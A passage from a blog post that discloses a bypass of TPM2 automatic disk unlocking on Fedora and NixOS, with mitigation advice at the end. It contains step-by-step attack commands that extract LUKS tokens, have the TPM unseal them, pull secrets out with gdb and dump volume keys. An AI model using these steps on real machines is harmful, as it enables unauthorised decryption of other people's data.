+</span></code></pre><h4 id="verifying-pcrs"><span><span><a href="#verifying-pcrs" aria-label="Anchor link for: verifying-pcrs">🔗</a></span> Verifying PCRs</span></h4><p>Now let's check whether any of the PCRs was affected by our
+operation:</p><pre data-lang="bash"><code data-lang="bash"><span>localhost:~#</span><span> tpm2_pcrread
+</span><span>  </span><span>sha1:
+</span><span>  </span><span>sha256:
+</span><span>    </span><span>0</span><span> : 0x8C2AF609E626CC1687F66EA6D0E1A3605A949319514A26E7E1A90D6A35646FA5
+</span><span>    </span><span>1</span><span> : 0x299B0462537A9505F6C63672B76A3502373C8934F08A921E1AA50D3ADF4BA83D
+</span><span>    </span><span>2</span><span> : 0x3D458CFE55CC03EA1F443F1562BEEC8DF51C75E14A9FCF9A7234A13F198E7969
+</span><span>    </span><span>3</span><span> : 0x3D458CFE55CC03EA1F443F1562BEEC8DF51C75E14A9FCF9A7234A13F198E7969
+</span><span>    </span><span>4</span><span> : 0x5FDBD66C267BD9513DBC569DB0B389A37445E1AA463F9325EA921563E7FB37EB
+</span><span>    </span><span>5</span><span> : 0x38A281376260137602E5C70F7A9057E4C55830D22A02BB5A66013D6AC2576D2F
+</span><span>    </span><span>6</span><span> : 0x3D458CFE55CC03EA1F443F1562BEEC8DF51C75E14A9FCF9A7234A13F198E7969
+</span><span>    </span><span>7</span><span> : 0x4770A4FB1DAC716FEADDD77FEC9A28BB2015E809A34ADD1A9D417EEC36EC1E17
+</span><span>    </span><span>8</span><span> : 0xE3E23C0DA36FA31767885AEC7AEE3180FB2F5E0B67569C3A82C2A1C3CA88A651
+</span><span>    </span><span>9</span><span> : 0x091F6917B0C8788779F4D410046250E6747043A8CD1BD75BF90713CC6DE30D99
+</span><span>    </span><span>10:</span><span> 0x2566BDF57C3AA880F7B0C480F479C0A88E0E72AE7EF3C1888035E7238BBE9257
+</span><span>    </span><span>11:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
+</span><span>    </span><span>12:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
+</span><span>    </span><span>13:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
+</span><span>    </span><span>14:</span><span> 0x17CDEFD9548F4383B67A37A901673BF3C8DED6F619D36C8007562DE1D93C81CC
+</span><span>    </span><span>15:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
+</span><span>    </span><span>16:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
+</span><span>    </span><span>17:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+</span><span>    </span><span>18:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+</span><span>    </span><span>19:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+</span><span>    </span><span>20:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+</span><span>    </span><span>21:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+</span><span>    </span><span>22:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+</span><span>    </span><span>23:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
+</span><span>  </span><span>sha384:
+</span><span>  </span><span>sm3_256:
+</span></code></pre><p>The output format is slightly different to that of
+<code>systemd-analyze pcrs</code>, but we can see that all values
+are the same as in the real system. Some boards may have different
+values in PCR 1 after every power cycle, but don't worry, in that
+case you can be sure that the owner didn't use it either. So this
+means our attack was successful! We can now go ahead and retrieve
+the volume key of the original partition.</p><p>By quickly skimming <a href="https://github.com/latchset/clevis/blob/0839ee294a2cbb0c1ecf1749c9ca530ef9f59f8f/src/initramfs-tools/scripts/local-top/clevis.in#L78">the clevis source</a> we find that it stores a JWE token in the
+LUKS header, which contains an encrypted secondary key to unlock
+the partition. It also contains some metadata required to have it
+decrypted by the TPM, like which PCRs have to be used in the TPM
+context. Back when we inspected the LUKS header, we found the
+clevis token in slot 0, so let's first extract this token:</p><pre data-lang="bash"><code data-lang="bash"><span>localhost:~#</span><span> mount</span><span> -o</span><span> remount,rw / </span><span># This alpine image is not writable by default
+</span><span>localhost:~#</span><span> mount /dev/nvme0n1p1 /mnt
+</span><span>localhost:~#</span><span> cryptsetup token export</span><span> --token-id</span><span> 0 /mnt/luks-original.bak </span><span>| </span><span>tee</span><span> token.json
+</span><span>{
+</span><span>  </span><span>"type"</span><span>: </span><span>"clevis"</span><span>,
+</span><span>  </span><span>"keyslots"</span><span>:</span><span> [
+</span><span>    </span><span>"1"
+</span><span>  </span><span>],
+</span><span>  </span><span>"jwe"</span><span>: </span><span>{
+</span><span>    </span><span>"ciphertext"</span><span>: </span><span>"hNNirkMsfcEWcVKfTFCY3JKNCk0x-8P4svgzkeulNhHnuaOdFQ4YfOCUUX9pkWvonfE2uivS"</span><span>,
+</span><span>    </span><span>"encrypted_key"</span><span>: </span><span>""</span><span>,
+</span><span>    </span><span>"iv"</span><span>: </span><span>"5zuFP0kEuqiCh0QL"</span><span>,
+</span><span>    </span><span>"protected"</span><span>: </span><span>"eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwiY2xldmlzIjp7InBpbiI6InRwbTIiLCJ0cG0yIjp7Imhhc2giOiJzaGEyNTYiLCJqd2tfcHJpdiI6IkFOMEFJRXFpblRfb3Y5cTZHVFo3TU1TcW0tUXgzT1RNaEN6ZTVTUUxRTDhDbGNoakFCQ3Z5Tldyd2lZalRaVzZUNG1rSjd4UF9CeDlCa2N0UXFFZzF6eUZ4aTdMcTRBWTcxWnpGOEVrano3QmRlVWZ3TV9PT2pOdGVGcmZFdUItQzRONGRhWDZ0VHk3RTBrc3BuS3luN3VRQ0p6VDVrcU4yYkpPM0FGTEpwbG1JNWxseXhVdHNQZmRSamhSTFUyWXN6V2Fvay1VQlZsNGtuOWNHTUZCNFdZQmFHd01oM0QwZjF1TjdQUVV4cGx6bWtRSmQzX1FRUGZBM3VNMDZRcXY4OU14STVCc3dra3FiWEhSVmhNNFVCOXNLcjd0dzgzVkFFdXpzZ3c5OXciLCJqd2tfcHViIjoiQUU0QUNBQUxBQUFFa2dBZ2d1X2RMZTk2Z0dyRkZycWw2NXltWG5DQ1RMWWVMYXFkQ0NfSkRRa0R4M01BRUFBZ1UwVFhKaXZhaTVuWVNONGNUT05lNkNJR0djX2ZGbDd6ZlNsNUZuOTFvU0kiLCJrZXkiOiJlY2MiLCJwY3JfYmFuayI6InNoYTI1NiIsInBjcl9pZHMiOiI0LDUsNyw5In19fQ"</span><span>,
+</span><span>    </span><span>"tag"</span><span>: </span><span>"7DIhyL_ZNocrUHTPr1PQWg"
+</span><span>  }
+</span><span>}
+</span></code></pre><p>Clevis would then proceed to extract a JWE token and hand it to
+<code>clevis-decrypt-tpm2</code> which decrypts it using the TPM,
+so we replicate the procedure:</p><pre data-lang="bash"><code data-lang="bash"><span># Get the contents of the .jwe field
+</span><span>localhost:~#</span><span> jose fmt</span><span> -j</span><span> token.json</span><span> -Og</span><span> jwe</span><span> -o- </span><span>| </span><span>tee</span><span> jwe.json
+</span><span>{
+</span><span>  </span><span>"ciphertext"</span><span>: </span><span>"hNNirkMsfcEWcVKfTFCY3JKNCk0x-8P4svgzkeulNhHnuaOdFQ4YfOCUUX9pkWvonfE2uivS"</span><span>,
+</span><span>  </span><span>"encrypted_key"</span><span>: </span><span>""</span><span>,
+</span><span>  </span><span>"iv"</span><span>: </span><span>"5zuFP0kEuqiCh0QL"</span><span>,
+</span><span>  </span><span>"protected"</span><span>: </span><span>"eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwiY2xldmlzIjp7InBpbiI6InRwbTIiLCJ0cG0yIjp7Imhhc2giOiJzaGEyNTYiLCJqd2tfcHJpdiI6IkFOMEFJRXFpblRfb3Y5cTZHVFo3TU1TcW0tUXgzT1RNaEN6ZTVTUUxRTDhDbGNoakFCQ3Z5Tldyd2lZalRaVzZUNG1rSjd4UF9CeDlCa2N0UXFFZzF6eUZ4aTdMcTRBWTcxWnpGOEVrano3QmRlVWZ3TV9PT2pOdGVGcmZFdUItQzRONGRhWDZ0VHk3RTBrc3BuS3luN3VRQ0p6VDVrcU4yYkpPM0FGTEpwbG1JNWxseXhVdHNQZmRSamhSTFUyWXN6V2Fvay1VQlZsNGtuOWNHTUZCNFdZQmFHd01oM0QwZjF1TjdQUVV4cGx6bWtRSmQzX1FRUGZBM3VNMDZRcXY4OU14STVCc3dra3FiWEhSVmhNNFVCOXNLcjd0dzgzVkFFdXpzZ3c5OXciLCJqd2tfcHViIjoiQUU0QUNBQUxBQUFFa2dBZ2d1X2RMZTk2Z0dyRkZycWw2NXltWG5DQ1RMWWVMYXFkQ0NfSkRRa0R4M01BRUFBZ1UwVFhKaXZhaTVuWVNONGNUT05lNkNJR0djX2ZGbDd6ZlNsNUZuOTFvU0kiLCJrZXkiOiJlY2MiLCJwY3JfYmFuayI6InNoYTI1NiIsInBjcl9pZHMiOiI0LDUsNyw5In19fQ"</span><span>,
+</span><span>  </span><span>"tag"</span><span>: </span><span>"7DIhyL_ZNocrUHTPr1PQWg"
+</span><span>}
+</span><span>
+</span><span># Convert this format into the actual JWE token format
+</span><span>localhost:~#</span><span> jose jwe fmt</span><span> -i</span><span> jwe.json</span><span> -c </span><span>| </span><span>tee</span><span> token.txt
+</span><span>eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwiY2xldmlzIjp7InBpbiI6InRwbTIiLCJ0cG0yIjp7Imhhc2giOiJzaGEyNTYiLCJqd2tfcHJpdiI6IkFOMEFJRXFpblRfb3Y5cTZHVFo3TU1TcW0tUXgzT1RNaEN6ZTVTUUxRTDhDbGNoakFCQ3Z5Tldyd2lZalRaVzZUNG1rSjd4UF9CeDlCa2N0UXFFZzF6eUZ4aTdMcTRBWTcxWnpGOEVrano3QmRlVWZ3TV9PT2pOdGVGcmZFdUItQzRONGRhWDZ0VHk3RTBrc3BuS3luN3VRQ0p6VDVrcU4yYkpPM0FGTEpwbG1JNWxseXhVdHNQZmRSamhSTFUyWXN6V2Fvay1VQlZsNGtuOWNHTUZCNFdZQmFHd01oM0QwZjF1TjdQUVV4cGx6bWtRSmQzX1FRUGZBM3VNMDZRcXY4OU14STVCc3dra3FiWEhSVmhNNFVCOXNLcjd0dzgzVkFFdXpzZ3c5OXciLCJqd2tfcHViIjoiQUU0QUNBQUxBQUFFa2dBZ2d1X2RMZTk2Z0dyRkZycWw2NXltWG5DQ1RMWWVMYXFkQ0NfSkRRa0R4M01BRUFBZ1UwVFhKaXZhaTVuWVNONGNUT05lNkNJR0djX2ZGbDd6ZlNsNUZuOTFvU0kiLCJrZXkiOiJlY2MiLCJwY3JfYmFuayI6InNoYTI1NiIsInBjcl9pZHMiOiI0LDUsNyw5In19fQ..5zuFP0kEuqiCh0QL.hNNirkMsfcEWcVKfTFCY3JKNCk0x-8P4svgzkeulNhHnuaOdFQ4YfOCUUX9pkWvonfE2uivS.7DIhyL_ZNocrUHTPr1PQWg
+</span><span>
+</span><span># Use the clevis-decrypt-tpm2 script to decrypt it with the TPM2
+</span><span>localhost:~#</span><span> cat token.txt </span><span>| </span><span>tr -d </span><span>'\n' </span><span>| </span><span>clevis-decrypt-tpm2
+</span><span>4yurbtxybpBwHBi2O2Kea1vDmhjDRt6yudAKYXinsiI3EUSjwYhwZA
+</span></code></pre><p>Awesome! We got a password out of it, which is the password
+<code>clevis</code> originally added to the LUKS partition and
+which can be used to unlock it! Let's also dump the volume key for
+future "safekeeping" 🤡:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> cryptsetup luksDump /mnt/luks-original.bak</span><span> --dump-volume-key --volume-key-file</span><span> volume-key.txt \
+</span><span>                    --key-file </span><span>&lt;</span><span>(</span><span>echo </span><span>-n</span><span> 4yurbtxybpBwHBi2O2Kea1vDmhjDRt6yudAKYXinsiI3EUSjwYhwZA)
+</span><span># [...]
+</span><span>Are</span><span> you sure</span><span>?</span><span> (Type </span><span>'yes'</span><span> in capital letters)</span><span>:</span><span> YES
+</span><span>LUKS</span><span> header information for /mnt/luks-original.bak
+</span><span>Cipher</span><span> name:    aes
+</span><span>Cipher</span><span> mode:    xts-plain64
+</span><span>Payload</span><span> offset: 32768
+</span><span>UUID:</span><span>           779328d5-00ca-4ade-be44-6daa549642ed
+</span><span>MK</span><span> bits:        512
+</span><span>Key</span><span> stored to file volume-key.txt.
+</span><span>
+</span><span>[root@localhost]#</span><span> cat volume-key.txt </span><span>| </span><span>hexdump
+</span><span>0000000</span><span> 0e42 f904 ae92 97a2 84a0 920a 3b09 faf5
+</span><span>0000010</span><span> 4feb 1775 b0de 0448 e4f4 c57f 35e6 7e34
+</span><span>0000020</span><span> d200 2016 8623 2cd2 5e8e 2262 320a 3e74
+</span><span>0000030</span><span> 6411 6454 866a d81e 88ff 8dbf b70b 9eef
+</span><span>0000040
+</span></code></pre><p>At this point we only have to restore the partition to its
+original state and decrypt the real partition. We can either reboot
+into a live system (possible if the Microsoft keys are still in the
+secure boot database) or put the disk back into a system we
+control. Finally, we can mount the encrypted disk to have a look
+inside:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> dd if=/mnt/luks-original.bak of=/dev/nvme0n1p3 bs=64M count=1
+</span><span>[root@localhost]#</span><span> cryptsetup luksOpen /dev/nvme0n1p3 original \
+</span><span>                    --key-file </span><span>&lt;</span><span>(</span><span>echo </span><span>-n</span><span> 4yurbtxybpBwHBi2O2Kea1vDmhjDRt6yudAKYXinsiI3EUSjwYhwZA)
+</span><span>[root@localhost]#</span><span> mount /dev/mapper/original /mnt
+</span><span>[root@localhost]#</span><span> cat /mnt/etc/os-release
+</span><span>NAME</span><span>=</span><span>"Fedora Linux"
+</span><span>VERSION</span><span>=</span><span>"41 (Server Edition)"
+</span><span>RELEASE_TYPE</span><span>=</span><span>stable
+</span><span>ID</span><span>=</span><span>fedora
+</span><span>VERSION_ID</span><span>=</span><span>41
+</span><span>VERSION_CODENAME</span><span>=</span><span>""
+</span><span>PLATFORM_ID</span><span>=</span><span>"platform:f41"
+</span><span>PRETTY_NAME</span><span>=</span><span>"Fedora Linux 41 (Server Edition)"
+</span><span>ANSI_COLOR</span><span>=</span><span>"0;38;2;60;110;180"
+</span><span>LOGO</span><span>=</span><span>fedora-logo-icon
+</span><span>CPE_NAME</span><span>=</span><span>"cpe:/o:fedoraproject:fedora:41"
+</span><span>HOME_URL</span><span>=</span><span>"https://fedoraproject.org/"
+</span><span>DOCUMENTATION_URL</span><span>=</span><span>"https://docs.fedoraproject.org/en-US/fedora/f41/system-administrators-guide/"
+</span><span>SUPPORT_URL</span><span>=</span><span>"https://ask.fedoraproject.org/"
+</span><span>BUG_REPORT_URL</span><span>=</span><span>"https://bugzilla.redhat.com/"
+</span><span>REDHAT_BUGZILLA_PRODUCT</span><span>=</span><span>"Fedora"
+</span><span>REDHAT_BUGZILLA_PRODUCT_VERSION</span><span>=</span><span>41
+</span><span>REDHAT_SUPPORT_PRODUCT</span><span>=</span><span>"Fedora"
+</span><span>REDHAT_SUPPORT_PRODUCT_VERSION</span><span>=</span><span>41
+</span><span>SUPPORT_END</span><span>=</span><span>2025-05-13
+</span><span>VARIANT</span><span>=</span><span>"Server Edition"
+</span><span>VARIANT_ID</span><span>=</span><span>server
+</span></code></pre><p>Success! Apart from researching all of the tools and their
+internals this has been a rather simple process. I would even claim
+that with some preparation we can repeat this reliably in under 10
+minutes. All it takes is two disk swaps and a few reboots.</p><p><em>Finally I can rest easy knowing that my roommate can make a
+surprise backup of my server's data while I'm away 🎉. A solid
+3-2-1(+1) strategy.</em></p><h2 id="proof-of-concept-exploitation-of-a-nixos-machine"><span><span><a href="#proof-of-concept-exploitation-of-a-nixos-machine" aria-label="Anchor link for: proof-of-concept-exploitation-of-a-nixos-machine">🔗</a></span> Proof-of-concept exploitation of a NixOS machine</span></h2><p><em>This will be very similar to the previous PoC, so I skipped
+a lot of the boilerplate this time. If you are not specifically
+interested in NixOS or systemd-cryptenroll, you can jump to the
+next section <a href="https://oddlama.org/blog/bypassing-disk-encryption-with-tpm2-unlock/#what-now">by clicking here</a>.</em></p><p>Secure boot on NixOS is currently implemented by the awesome
+<a href="https://github.com/nix-community/lanzaboote">lanzaboote</a>
+project, which does some things differently than what we just saw
+on Fedora. Most notably we will enroll our own secure boot keys
+(and can wipe the microsoft keys), our kernel and initrd will both
+be fully signed as a UKI image and systemd-boot will not allow you
+to edit the command line. Another small difference to the Fedora
+setup is that we will use <code>systemd-cryptenroll</code> instead
+of <code>clevis</code>.</p><p>In any case, the overall exploitation will be very similar, the
+NixOS initrd also doesn't verify LUKS identities (as of January
+2025).</p><h4 id="system-setup"><span><span><a href="#system-setup" aria-label="Anchor link for: system-setup">🔗</a></span> System setup</span></h4><p>Fortunately, the setup is extremely simple with lanzaboote. I
+recommend having a look at their <a href="https://github.com/nix-community/lanzaboote/blob/master/docs/QUICK_START.md">Quick Start Guide</a> in case you don't know the project already.
+I've added the full configuration of the test machine <a href="https://oddlama.org/bypassing-disk-encryption/flake.nix">here</a>, in case you want
+to replicate this. The final setup steps were:</p><pre data-lang="bash"><code data-lang="bash"><span># Clear secure boot keys, start nixos live image, copy flake to live image, then:
+</span><span>[root@nixos]#</span><span> alias nix=</span><span>'nix --experimental-features "nix-command flakes"'
+</span><span>[root@nixos]#</span><span> nix build</span><span> --print-out-paths</span><span> .#nixosConfigurations.nixos.config.system.build.diskoScript
+</span><span>/nix/store/1a51ykfsdnc0rpzlawyy7rvb889l6874-disko
+</span><span>[root@nixos]#</span><span> nix build</span><span> --print-out-paths</span><span> .#nixosConfigurations.nixos.config.system.build.toplevel
+</span><span>/nix/store/5yqhbkqqw1kcr13157z4am1r5i02ll0d-nixos-system-nixos-25.05.20250110.130595e
+</span><span>
+</span><span># Format and install:
+</span><span>[root@nixos]#</span><span> /nix/store/1a51ykfsdnc0rpzlawyy7rvb889l6874-disko  </span><span># Format disk(s)
+</span><span>[root@nixos]#</span><span> nixos-install</span><span> --no-root-password --system </span><span>\        </span><span># Install system
+</span><span>                </span><span>/nix/store/5yqhbkqqw1kcr13157z4am1r5i02ll0d-nixos-system-nixos-25.05.20250110.130595e
+</span><span>[root@nixos]#</span><span> nixos-enter</span><span> --mountpoint</span><span> /mnt</span><span> --</span><span> sbctl create-keys </span><span># Create and enroll secure boot keys, need to rerun install afterwards to make lanzaboote happy
+</span><span>
+</span><span># Reboot and enroll LUKS key:
+</span><span>[root@nixos]#</span><span> systemd-cryptenroll /dev/disk/by-partlabel/disk-main-luks</span><span> --tpm2-device</span><span>=</span><span>auto</span><span> --tpm2-pcrs</span><span>=</span><span>0+2+4+7
+</span><span># ... Enter password ...
+</span><span>New</span><span> TPM2 token enrolled as key slot 1.
+</span></code></pre><h4 id="inspecting-the-system-1"><span><span><a href="#inspecting-the-system-1" aria-label="Anchor link for: inspecting-the-system-1">🔗</a></span> Inspecting the system</span></h4><p>This step works in the same was as it did for Fedora, but we
+will find that the NixOS initrd works a bit differently - it itself
+is a kind of mini-NixOS. The important information is the
+following:</p><ul><li>The mount commands for filesystems are in systemd units, which
+usually use UUIDs, labels or partlables to identify disks. In our
+case it will be partlabels, so we don't even have to fake any
+UUIDs.</li><li>Once the initrd decrypts the root partition, it searches for
+the toplevel derivation by resolving the
+<code>init=/nix/store/&lt;hash&gt;-nixos-system-.../init</code>
+path</li><li>This toplevel derivation contains a <code>prepare-root</code>
+binary which is the first one that is executed. This is our entry
+point.</li></ul><h4 id="luks-partition-backup-and-overwrite"><span><span><a href="#luks-partition-backup-and-overwrite" aria-label="Anchor link for: luks-partition-backup-and-overwrite">🔗</a></span>
+LUKS partition backup and overwrite</span></h4><p>Next, we overwrite the LUKS partition and overwrite it with our
+fake. We can reuse the same fake partition with the Alpine image as
+on Fedora as it has the advantage of being very small. If the user
+has <code>/nix</code> on a separate partition it may be simpler to
+just build a small NixOS system and link the resulting toplevel
+derivation to the path expected by the initrd.</p><p>Rebooting the original system with the modified disk will now
+yield an Alpine root shell. After running <code>tpm2_pcrread</code>
+we can verify that we have not changed any PCRs with our
+modifications. To understand the differences of
+<code>systemd-cryptenroll</code> over <code>clevis</code>, let's
+continue with some more detail from here:</p><p>Once again we will inspect the LUKS header of our backup, which
+I've also copied over to the boot partition for easy access. We see
+that <code>systemd-cryptenroll</code> creates a token in the LUKS
+header, similar to <code>clevis</code>:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> cryptsetup luksDump /mnt/luks-original.bak
+</span><span>LUKS</span><span> header information
+</span><span>Version:</span><span>        2
+</span><span>Epoch:</span><span>          6
+</span><span>Metadata</span><span> area:  16384 </span><span>[</span><span>bytes</span><span>]
+</span><span>Keyslots</span><span> area:  16744448 </span><span>[</span><span>bytes</span><span>]
+</span><span>UUID:</span><span>           5a9d9566-aae2-49b9-abf5-c6f0a887159c
+</span><span># [...]
+</span><span>Tokens:
+</span><span>  </span><span>0:</span><span> systemd-tpm2
+</span><span>    </span><span>Keyslot:</span><span>    1
+</span><span># [...]
+</span><span>
+</span><span>[root@localhost]#</span><span> cryptsetup token export</span><span> --token-id</span><span> 0 /mnt/luks-original.bak </span><span>| </span><span>tee</span><span> token.json
+</span><span>{
+</span><span>  </span><span>"type"</span><span>: </span><span>"systemd-tpm2"</span><span>,
+</span><span>  </span><span>"keyslots"</span><span>: </span><span>[ </span><span>"1" </span><span>]</span><span>,
+</span><span>  </span><span>"tpm2-blob"</span><span>: </span><span>"AJ4AIPtjVjiz90zIPEHgRoJVpsix/e1tBRaMkOv0tWEBBKegABC5vMp9mQt81TjlRmtEhca98VfRuXxAoYcB5yjzShhTZhfCzwgXpC7rd5TETxBhvtWbo4BQULmZT29InkqpXRaO/b7DyXqLDQusdAfQO/lQSVxwWjVR576OFJUvAMPN6XEVyH8jDFd+F5FtuaEsYS4t46ThxMWa10ttRwBOAAgACwAABBIAIE8jssxPAKj8Duc+hrtEmIZxQS0Hv3Uptj92Ud33KVpBABAAIDBubaOpjc3KX/Lj0jHbe9plgv9wTIKYsUtFCKOGotRU"</span><span>,
+</span><span>  </span><span>"tpm2-pcrs"</span><span>: </span><span>[</span><span> 0, 2, 4, 7 </span><span>]</span><span>,
+</span><span>  </span><span>"tpm2-pcr-bank"</span><span>: </span><span>"sha256"</span><span>,
+</span><span>  </span><span>"tpm2-policy-hash"</span><span>: </span><span>"4f23b2cc4f00a8fc0ee73e86bb44988671412d07bf7529b63f7651ddf7295a41"</span><span>,
+</span><span>  </span><span>"tpm2_srk"</span><span>: </span><span>"gQAAAQAiAAt+KklPEEbTTiWnmjC8TapUFILGmpUxJHOLyhfoPjJpFwAAAAEAWgAjAAsAAwRyAAAABgCAAEMAEAADABAAIB/V/x4OEuiI/TAynXAqG6pJHrJH9GJoEtgjqa+C0AlkACDBNasZylLB/v5PdYsWfJgE/MXZeUi2LMVE/FXfbsyDAw=="
+</span><span>}
+</span></code></pre><p>The token format is slightly different to that from
+<code>clevis</code>, it just contains all necessarey information on
+the toplevel without a roundtrip through JWE. To understand how the
+values are supposed to be used, we need to understand what
+<code>systemd-cryptenroll</code> does to unlock the disk. In the
+systemd source code we find that the responsible function is called
+<a href="https://github.com/systemd/systemd/blob/main/src/cryptsetup/cryptsetup.c#L1834"><code>static int tpm2_unseal(...)</code></a>. Instead of tediously
+replicating all the unmarshalling logic, we can just call
+<code>systemd-cryptsetup</code> through gdb and dump the decrypted
+secret after that function was called:</p><pre data-lang="bash"><code data-lang="bash"><span>gdb --args</span><span> systemd-cryptsetup attach test /mnt/luks-original.img
+</span><span># [...]
+</span><span>(</span><span>gdb</span><span>) break tpm2_unseal
+</span><span>Function </span><span>"tpm2_unseal"</span><span> not defined.
+</span><span>Make</span><span> breakpoint pending on future shared library load</span><span>?</span><span> (y or </span><span>[</span><span>n</span><span>]</span><span>) </span><span>y
+</span><span>Breakpoint</span><span> 1 (tpm2_unseal) </span><span>pending.
+</span><span>(</span><span>gdb</span><span>) run
+</span><span>Breakpoint</span><span> 1, 0x00007ffff7bb2f90 in tpm2_unseal ()
+</span><span>(</span><span>gdb</span><span>) backtrace
+</span><span>#0  0x00007ffff7bb2f90 in tpm2_unseal () from libsystemd-shared-256.so
+</span><span>#1  0x00007ffff721d7e7 in acquire_luks2_key () from libcryptsetup-token-systemd-tpm2.so
+</span><span>#2  0x00007ffff721c60f in cryptsetup_token_open_pin () from libcryptsetup-token-systemd-tpm2.so
+</span><span>#3  0x00007ffff721caf5 in cryptsetup_token_open () from libcryptsetup-token-systemd-tpm2.so
+</span><span># ...
+</span></code></pre><p>By investigating the functions shown in the callstack, we see
+that right before <a href="https://github.com/systemd/systemd/blob/cc7300fc5868f6d47f3f47076100b574bf54e58d/src/cryptsetup/cryptsetup-tokens/cryptsetup-token-systemd-tpm2.c#L35"><code>cryptsetup_token_open_pin()</code></a> returns, it base64
+encodes the unsealed secret which is later used as the slot 1 LUKS
+password. So we just set a breakpoint to the base64 encoding
+function and print the secret once it returns (the result pointer
+is the third argument, so it will be passed via
+<code>rcx</code>):</p><pre data-lang="bash"><code data-lang="bash"><span>(</span><span>gdb</span><span>) break base64mem_full
+</span><span>(</span><span>gdb</span><span>) continue
+</span><span>(</span><span>gdb</span><span>) info registers
+</span><span># ...
+</span><span>rcx</span><span>            0x7fffffffc920      140737488341280 </span><span># pointer to base64 result
+</span><span># ...
+</span><span>(</span><span>gdb</span><span>) set $</span><span>a</span><span> = $</span><span>rcx </span><span># remember where the result will be stored
+</span><span>(</span><span>gdb</span><span>) finish
+</span><span>(</span><span>gdb</span><span>) printf </span><span>"%s\n"</span><span>, </span><span>*</span><span>(char</span><span>**</span><span>)$</span><span>a
+</span><span>qvramS8M9tetETI1I53p6HWqh1avSqsj/uqpQbvE90s</span><span>=
+</span></code></pre><p>Let's test this password by dumping the volume key.</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> cryptsetup luksDump /mnt/luks-original.bak</span><span> --dump-volume-key --volume-key-file</span><span> volume-key.txt \
+</span><span>                    --key-file </span><span>&lt;</span><span>(</span><span>echo </span><span>-n </span><span>"qvramS8M9tetETI1I53p6HWqh1avSqsj/uqpQbvE90s="</span><span>)
+</span><span># [...]
+</span><span>Are</span><span> you sure</span><span>?</span><span> (Type </span><span>'yes'</span><span> in capital letters)</span><span>:</span><span> YES
+</span><span>LUKS</span><span> header information for copy.img
+</span><span>Cipher</span><span> name:    aes
+</span><span>Cipher</span><span> mode:    xts-plain64
+</span><span>Payload</span><span> offset: 32768
+</span><span>UUID:</span><span>           5a9d9566-aae2-49b9-abf5-c6f0a887159c
+</span><span>MK</span><span> bits:        512
+</span><span>Key</span><span> stored to file volume-key.txt.
+</span><span>
+</span><span>[root@localhost]#</span><span> cat volume-key.txt </span><span>| </span><span>hexdump
+</span><span>0000000</span><span> 065a cc94 26c0 b0cc 4bcf bf73 e9bb 3c16
+</span><span>0000010</span><span> 95da 149e 6881 1a5b e7f5 4b59 4bc9 db83
+</span><span>0000020</span><span> 6008 d237 29a8 9fc7 7a83 dbbf 816e 5ad0
+</span><span>0000030</span><span> 20fa 03f6 effd 39f5 1f78 8779 c501 35b6
+</span><span>0000040
+</span></code></pre><p>Nice, we've successfully extracted the volume key again!
+Finally, we need to restore the original disk header and are then
+able to decrypt the whole disk. We can either decrypt it by
+specifying the volume key explicitly, or simply enter the obtained
+password. Since this is exactly the same as on Fedora, I have not
+included it here.</p><h4 id="crude-implementation-of-pcr15-verification"><span><span><a href="#crude-implementation-of-pcr15-verification" aria-label="Anchor link for: crude-implementation-of-pcr15-verification">🔗</a></span>
+Crude implementation of PCR15 verification</span></h4><p>I've looked at all of this together with my friend <a href="https://github.com/patrickdag">@PatrickDaG</a>, who has quickly
+written <a href="https://forge.lel.lol/patrick/nix-config/src/commit/ab2cb2b4d554040ce208fc60624fe729a9d5e32b/modules/ensure-pcr.nix">a NixOS module</a> which you can adapt to add a crude form of PCR
+15 verification. Ideally we need something proper upstreamed into
+nixpkgs, but ensuring the order of decryption is not super
+simple.</p><h2 id="what-now"><span><span><a href="#what-now" aria-label="Anchor link for: what-now">🔗</a></span> What now?</span></h2><p>It's obviously a pity that the default initrd implementations
+available on most distributions don't include a verification step
+out of the box. But there's really nobody to blame here, as none of
+the distributions advertise automatic TPM unlocking as a secure or
+even supported configuration, and the guides I've linked to are
+mostly blog posts from other hobbyists - who may just not have
+known about this issue.</p><p><em>If you happen to have written about this before, please
+update your post(s) to make your readers aware of the implications!
+Thank you!</em></p><p>Unfortunately, I have also not found a simple solution that I
+can recommend to you right now to actually fix the issue (except
+for NixOS, <a href="https://oddlama.org/blog/bypassing-disk-encryption-with-tpm2-unlock/#crude-implementation-of-pcr15-verification">see above</a>). Enabling mandatory LUKS key measurement and PCR 15
+verification in the initrd is just not something that is easily
+available as a module or script right now (January 2025), so you'd
+have to implement it yourself.</p><p>From what I learned when researching this, a proper
+implementation would need to at least:</p><ul><li>Predict the value of PCR 15 value at initrd generation
+time</li><li>Implicitly sign this value by adding it to the initrd</li><li>Extend PCR 15 at boot time with the volume key of every
+decrypted LUKS volume, while ensuring in a deterministic decryption
+order</li><li>Verify PCR 15 against the known and signed value
+<em>before</em> utilizing any data from one of the the encrypted
+disks</li></ul><p>The easiest way to protect your data right now is to bite the
